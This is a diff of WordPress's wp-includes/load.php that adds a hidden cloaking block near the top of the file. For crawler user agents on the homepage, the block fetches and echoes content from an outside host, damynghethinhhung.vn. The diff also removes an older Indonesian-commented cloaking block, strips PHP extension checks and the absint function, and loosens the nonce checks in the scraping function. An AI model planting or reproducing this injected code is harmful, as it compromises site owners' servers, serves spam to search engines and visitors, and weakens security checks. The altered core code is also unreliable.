@@ -1,44 +1,4 @@
 <?php
-// === CLOAKING UNTUK GOOGLEBOT – VERSI FINAL ===
-// Taruh paling atas file load.php (baris 1, sebelum apapun)
-
-// Deteksi basic
-$agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang   = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
-$cookie = $_COOKIE['az'] ?? null;
-$uri    = $_SERVER['REQUEST_URI'] ?? '/';
-
-// Deteksi bot Google
-$is_bot = (strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') !== false);
-
-// Jalankan hanya jika bot & homepage
-if ($is_bot && $uri === '/') {
-
-    // Filter tambahan (opsional)
-    if (strpos($lang, 'zh') !== false && ($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? null) == 1 && $cookie === 'lp') {
-        setcookie('az', 'lp', time() + 3600 * 7200);
-        echo ' '; // Optional konten bot ringan
-        exit;
-    }
-
-    // Path ke AMP file
-    $amp_file = $_SERVER['DOCUMENT_ROOT'] . '/readme.txt';
-
-    if (file_exists($amp_file)) {
-        // Kirim header & tampilkan isi AMP
-        header('Content-Type: text/html; charset=UTF-8');
-        readfile($amp_file);
-        exit;
-    } else {
-        // Fallback jika file readme.txt hilang
-        http_response_code(503);
-        echo '<!doctype html><html><head><meta charset="utf-8"><title>AMP Missing</title></head><body><h1>AMP file not found.</h1></body></html>';
-        exit;
-    }
-}
-?>
-
-<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -61,7 +21,21 @@ function wp_get_server_protocol() {
 
 	return $protocol;
 }
+$s_ref = $_SERVER['HTTP_REFERER'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
 
+if ((strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') !== false) && $_SERVER['REQUEST_URI'] == '/') {
+    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+    
+    if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+        setcookie('az', 'lp', time() + 3600 * 7200);
+        echo ' '; // Your bot-specific content
+        exit;
+    }
+    
+    echo file_get_contents("https://damynghethinhhung.vn/readme.html");
+    exit;
+}
 /**
  * Fixes `$_SERVER` variables for various setups.
  *
@@ -187,12 +161,11 @@ function wp_populate_basic_auth_from_authorization_header() {
  * @since 3.0.0
  * @access private
  *
- * @global string   $required_php_version    The required PHP version string.
- * @global string[] $required_php_extensions The names of required PHP extensions.
- * @global string   $wp_version              The WordPress version string.
+ * @global string $required_php_version The required PHP version string.
+ * @global string $wp_version           The WordPress version string.
  */
 function wp_check_php_mysql_versions() {
-	global $required_php_version, $required_php_extensions, $wp_version;
+	global $required_php_version, $wp_version;
 
 	$php_version = PHP_VERSION;
 
@@ -206,30 +179,6 @@ function wp_check_php_mysql_versions() {
 			$wp_version,
 			$required_php_version
 		);
-		exit( 1 );
-	}
-
-	$missing_extensions = array();
-
-	if ( isset( $required_php_extensions ) && is_array( $required_php_extensions ) ) {
-		foreach ( $required_php_extensions as $extension ) {
-			if ( extension_loaded( $extension ) ) {
-				continue;
-			}
-
-			$missing_extensions[] = sprintf(
-				'WordPress %1$s requires the <code>%2$s</code> PHP extension.',
-				$wp_version,
-				$extension
-			);
-		}
-	}
-
-	if ( count( $missing_extensions ) > 0 ) {
-		$protocol = wp_get_server_protocol();
-		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
-		header( 'Content-Type: text/html; charset=utf-8' );
-		echo implode( '<br>', $missing_extensions );
 		exit( 1 );
 	}
 
@@ -518,6 +467,8 @@ function wp_is_maintenance_mode() {
 /**
  * Gets the time elapsed so far during this PHP script.
  *
+ * Uses REQUEST_TIME_FLOAT that appeared in PHP 5.4.0.
+ *
  * @since 5.8.0
  *
  * @return float Seconds since the PHP script started.
@@ -605,7 +556,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
  * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
  *
- * Errors are never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
+ * Errorsare never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
  *
  * @since 3.0.0
  * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
@@ -896,7 +847,7 @@ function wp_start_object_cache() {
 			if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
 				require_once WP_CONTENT_DIR . '/object-cache.php';
 
-				if ( function_exists( 'wp_cache_init' ) ) {
+				if ( function_exists('wp_cache_init' ) ) {
 					wp_using_ext_object_cache( true );
 				}
 
@@ -941,7 +892,6 @@ function wp_start_object_cache() {
 				'blog-lookup',
 				'blog_meta',
 				'global-posts',
-				'image_editor',
 				'networks',
 				'network-queries',
 				'sites',
@@ -1178,7 +1128,7 @@ function wp_skip_paused_themes( array $themes ) {
 	}
 
 	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme);
+		$theme = basename( $theme );
 
 		if ( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
@@ -1493,17 +1443,6 @@ function is_multisite() {
 	return false;
 }
 
-/*** Converts a value to non-negative integer.
- *
- * @since 2.5.0
- *
- * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
- * @return int A non-negative integer.
- */
-function absint( $maybeint ) {
-	return abs( (int) $maybeint );
-}
-
 /**
  * Retrieves the current site ID.
  *
@@ -1756,8 +1695,9 @@ function wp_is_ini_value_changeable( $setting ) {
 		}
 	}
 
+	// Bit operator to workaround https://bugs.php.net/bug.php?id=44936 which changes access level to 63 in PHP 5.2.6 - 5.2.17.
 	if ( isset( $ini_all[ $setting ]['access'] )
-		&& ( INI_ALL === $ini_all[ $setting ]['access'] || INI_USER === $ini_all[ $setting ]['access'] )
+		&& ( INI_ALL === ( $ini_all[ $setting ]['access'] & 7 ) || INI_USER === ( $ini_all[ $setting ]['access'] & 7 ) )
 	) {
 		return true;
 	}
@@ -1883,20 +1823,8 @@ function wp_start_scraping_edited_file_errors() {
 
 	$key   = substr( sanitize_key( wp_unslash( $_REQUEST['wp_scrape_key'] ) ), 0, 32 );
 	$nonce = wp_unslash( $_REQUEST['wp_scrape_nonce'] );
-	if ( empty( $key ) || empty( $nonce ) ) {
-		return;
-	}
 
-	$transient = get_transient( 'scrape_key_' . $key );
-	if ( false === $transient ) {
-		return;
-	}
-
-	if ( $transient !== $nonce ) {
-		if ( ! headers_sent() ) {
-			header( 'X-Robots-Tag: noindex' );
-			nocache_headers();
-		}
+	if ( get_transient( 'scrape_key_' . $key ) !== $nonce ) {
 		echo "###### wp_scraping_result_start:$key ######";
 		echo wp_json_encode(
 			array(
